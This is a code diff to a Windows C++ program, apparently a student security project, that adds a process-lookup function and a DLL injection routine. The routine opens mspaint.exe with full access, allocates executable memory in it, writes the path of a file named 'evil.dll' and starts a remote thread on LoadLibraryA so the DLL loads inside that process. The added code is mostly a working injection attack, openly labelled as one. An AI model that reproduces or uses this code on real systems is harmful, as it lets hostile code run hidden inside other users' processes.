@@ -6,15 +6,49 @@
 #include <vector>
 #include <iterator>
 #include <algorithm>
-#include <fstream>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <cstring>
 #include <sstream>
 #include <winsock.h>
+#include <tlhelp32.h>
 using std::ostringstream;
 using std::ends;
 #pragma comment(lib, "ws2_32.lib")
+
+char evilDLL[] = "D:\\Cyber\\YB_CYBER\\project\\FinalProject\\ExeFiles\\ExeFiles\\evil.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+
+DWORD FindProcessId(const std::wstring& processName)
+{
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile))
+    {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo))
+    {
+        if (!processName.compare(processInfo.szExeFile))
+        {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
 
 int CreateSocket()
 {
@@ -154,6 +188,43 @@ int main()
         strText.size(),   // Buffer size
         &ov, // Overlapped
         l);
+    
+    // dll injection
+    DWORD pid = 0; // process ID
+    HANDLE ph; // process handle
+    HANDLE rt; // remote thread
+    LPVOID rb; // remote buffer
 
+    // handle to kernel32 and pass it to GetProcAddress
+    HMODULE hKernel32 = GetModuleHandle(L"Kernel32");
+    VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
+
+    // get process ID by name
+    pid = FindProcessId(L"mspaint.exe");
+    if (pid == 0) {
+        printf("PID not found :( exiting...\n");
+        return -1;
+    }
+    else {
+        printf("PID = %d\n", pid);
+    }
+
+    // open process
+    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+
+    // allocate memory buffer for remote process
+    rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+    // "copy" evil DLL between processes
+    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+
+    // our process start new thread
+    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+    if (!rt) {
+        DWORD err = GetLastError(); 
+        std::cout << err << std::endl;
+    }
+    CloseHandle(ph);
     return 0;
+
 }
